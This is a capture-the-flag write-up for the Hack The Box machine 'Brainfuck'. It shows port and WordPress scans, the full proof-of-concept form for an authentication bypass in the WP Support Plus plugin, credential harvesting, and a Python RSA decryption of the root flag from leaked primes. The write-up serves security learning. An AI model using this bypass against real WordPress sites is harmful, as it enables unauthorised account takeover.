## Enumeration

Port Scan
```bash
nmap -sC -sV -A -T4 10.10.10.17 -oN Nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-09 02:32 EDT
Nmap scan report for 10.10.10.17
Host is up (0.15s latency).
Not shown: 995 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)
|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)
|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)
25/tcp  open  smtp     Postfix smtpd
|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA USER TOP UIDL AUTH-RESP-CODE RESP-CODES SASL(PLAIN)
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: capabilities OK AUTH=PLAINA0001 ENABLE more listed have post-login SASL-IR IMAP4rev1 ID Pre-login LITERAL+ LOGIN-REFERRALS IDLE
443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb
| Not valid before: 2017-04-13T11:19:29
|_Not valid after:  2027-04-11T11:19:29
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   154.05 ms 10.10.14.1
2   154.78 ms 10.10.10.17

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.77 seconds
```
### Port 443
![image](https://user-images.githubusercontent.com/63084488/137349387-855f221e-1706-47c0-893c-e3ee5f299484.png)

### checking the certificate:

![image](https://user-images.githubusercontent.com/63084488/137349515-a0d59812-5aaa-4c1e-9591-1d5db22e5b84.png)

Add new dns name in /etc/hosts file

Visit https://sup3rs3cr3t.brainfuck.htb/
![image](https://user-images.githubusercontent.com/63084488/137349675-6148673d-d51d-4ea9-9427-12ce5d936cbe.png)

Visit www.brainfuck,htb
![image](https://user-images.githubusercontent.com/63084488/137349804-7cb16648-6f94-4866-866e-6e54f91f4c1b.png)

Since we have the wordpress site lets enumerate using the wpscan

```wpscan --url https://brainfuck.htb --disable-tls-checks
```

we got the wordpress version.
```
[+] WordPress version 4.7.3 identified (Insecure, released on 2017-03-06).
 | Found By: Rss Generator (Passive Detection)
 |  - https://brainfuck.htb/?feed=rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
 |  - https://brainfuck.htb/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.7.3</generator>
```

An outdated wordpress Plugin
```
[i] Plugin(s) Identified:

[+] wp-support-plus-responsive-ticket-system
 | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/
 | Last Updated: 2019-09-03T07:57:00.000Z
 | [!] The version is out of date, the latest version is 9.1.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 7.1.3 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt

```

Lets search for any exploits 
```
searchsploit WP Support Plus Responsive Ticket System
------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                      |  Path
------------------------------------------------------------------------------------ ---------------------------------
WordPress Plugin WP Support Plus Responsive Ticket System 2.0 - Multiple Vulnerabil | php/webapps/34589.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - Privilege Escalat | php/webapps/41006.txt
WordPress Plugin WP Support Plus Responsive Ticket System 7.1.3 - SQL Injection     | php/webapps/40939.txt
------------------------------------------------------------------------------------ ---------------------------------
```
Let’s look at the privilege escalation vulnerability.

```searchsploit -x 41006.txt```
```
# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
# Date: 10-01-2017
# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
# Exploit Author: Kacper Szurek
# Contact: http://twitter.com/KacperSzurek
# Website: http://security.szurek.pl/
# Category: web
 
1. Description

You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().

http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html

2. Proof of Concept

<form method="post" action="http://wp/wp-admin/admin-ajax.php">
        Username: <input type="text" name="username" value="administrator">
        <input type="hidden" name="email" value="sth">
        <input type="hidden" name="action" value="loginGuestFacebook">
        <input type="submit" value="Login">
</form>

Then you can go to admin panel.
/usr/share/exploitdb/exploits/php/webapps/41006.txt (END)
```
According to the [documentation](https://www.exploit-db.com/exploits/41006), this vulnerability allows you to bypass authentication by logging in as anyone without knowing the password. You do however need a valid username for the attack to work. Therefore, let’s use wpscan to enumerate usernames.

wpscan --url https://brainfuck.htb --disable-tls-checks --enumerate u

```
[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] administrator
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

###  Gaining an Initial Foothold

Copy the POC code from the [vulnerability entry on searchsploit](https://www.exploit-db.com/exploits/41006) and save it in the file privesc.html. Change the URL to the name of the machine.

Run it in the browser and login as administrator.
![image](https://user-images.githubusercontent.com/63084488/137349924-88a73a26-c54c-41b2-9f2f-d4c6297feaff.png)

Refresh the brainfuck.htb page and we’re logged in as administrator!
![image](https://user-images.githubusercontent.com/63084488/137349984-9346ce58-3fbb-4b6c-8889-e6c74d9bbfa1.png)

There doesn’t seem to be much functionality available for this user. Therefore, let’s try the ‘admin’ user next. Perform the same exploit again except with the username being ‘admin’.
![image](https://user-images.githubusercontent.com/63084488/137350072-a5396376-cd5f-417d-832f-bbc161cb8f51.png)

Go to themes from the dashboard
![image](https://user-images.githubusercontent.com/63084488/137350358-d19eb196-64ca-4ecd-8009-29e1ab511649.png)


Smtp passwd
![image](https://user-images.githubusercontent.com/63084488/137350454-7b74af76-4c7e-4d30-844a-540934a975b3.png)

Get the password by looking into the inspect element
![image](https://user-images.githubusercontent.com/63084488/137350551-891fa877-4754-472f-826e-3a4950d8dbe8.png)

![image](https://user-images.githubusercontent.com/63084488/137350682-04fde6b3-c69b-40d0-a8d0-8446ce8e7570.png)

![image](https://user-images.githubusercontent.com/63084488/137350952-3c6a3854-ff18-4c6d-91cc-c1754b8c57fc.png)

![image](https://user-images.githubusercontent.com/63084488/137351031-c3a49d11-080f-470a-9d33-830e43819777.png)

orisiteis mail box
![[Pasted image 20211010085604.png]]
we get another credentials
![[Pasted image 20211010085706.png]]

![[Pasted image 20211010085920.png]]

![[Pasted image 20211010085954.png]]


![[Pasted image 20211010092548.png]]

Key page which is encrypted
![[Pasted image 20211010092507.png]]


Decrytping
![[Pasted image 20211010095413.png]]
![[Pasted image 20211010095329.png]]


we get the encrypted idrsa
![[Pasted image 20211010095730.png]]



user:
![[Pasted image 20211010101453.png]]

```
orestis@brainfuck:~$ ls -la
total 60
drwxr-xr-x 7 orestis orestis 4096 Apr 29  2017 .
drwxr-xr-x 3 root    root    4096 Apr 13  2017 ..
-rw------- 1 root    root       1 Dec 24  2017 .bash_history
-rw-r--r-- 1 orestis orestis  220 Apr 13  2017 .bash_logout
-rw-r--r-- 1 orestis orestis 3771 Apr 13  2017 .bashrc
drwx------ 2 orestis orestis 4096 Apr 29  2017 .cache
drwxr-xr-x 3 root    root    4096 Apr 17  2017 .composer
-rw------- 1 orestis orestis  619 Apr 29  2017 debug.txt
-rw-rw-r-- 1 orestis orestis  580 Apr 29  2017 encrypt.sage
drwx------ 3 orestis orestis 4096 Apr 29  2017 mail
-rw------- 1 orestis orestis  329 Apr 29  2017 output.txt
-rw-r--r-- 1 orestis orestis  655 Apr 13  2017 .profile
drwx------ 8 orestis orestis 4096 Apr 29  2017 .sage
drwx------ 2 orestis orestis 4096 Apr 17  2017 .ssh
-r-------- 1 orestis orestis   33 Apr 29  2017 user.txt
```

```bash
orestis@brainfuck:~$ cat encrypt.sage 
nbits = 1024

password = open("/root/root.txt").read().strip()
enc_pass = open("output.txt","w")
debug = open("debug.txt","w")
m = Integer(int(password.encode('hex'),16))

p = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
q = random_prime(2^floor(nbits/2)-1, lbound=2^floor(nbits/2-1), proof=False)
n = p*q
phi = (p-1)*(q-1)
e = ZZ.random_element(phi)
while gcd(e, phi) != 1:
    e = ZZ.random_element(phi)



c = pow(m, e, n)
enc_pass.write('Encrypted Password: '+str(c)+'\n')
debug.write(str(p)+'\n')
debug.write(str(q)+'\n')
debug.write(str(e)+'\n')
```

```python
def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
        gcd = b
    return gcd, x, y
def main():
    p = 7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
    q = 7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
    e = 30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
    ct = 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182# compute n
    n = p * q# Compute phi(n)
    phi = (p - 1) * (q - 1)# Compute modular inverse of e
    gcd, a, b = egcd(e, phi)
    d = a
    print( "n:  " + str(d) );# Decrypt ciphertext
    pt = pow(ct, d, n)
    print( "pt: " + str(pt) )# Added code
    flag = hex(pt)
    flag = str(flag[2:-1])
    print flag.decode("hex")
if __name__ == "__main__":
    main()
```

```bash
orestis@brainfuck:~$ cat debug.txt 
7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307
7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079
30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997
```

Link for the script
https://crypto.stackexchange.com/questions/19444/rsa-given-q-p-and-e






```
orestis@brainfuck:~$ python attack.py 
n:  8730619434505424202695243393110875299824837916005183495711605871599704226978295096241357277709197601637267370957300267235576794588910779384003565449171336685547398771618018696647404657266705536859125227436228202269747809884438885837599321762997276849457397006548009824608365446626232570922018165610149151977
pt: 24604052029401386049980296953784287079059245867880966944246662849341507003750
6efc1a5dbb8904751ce6566a305bb8ef
orestis@brainfuck:~$ 
```
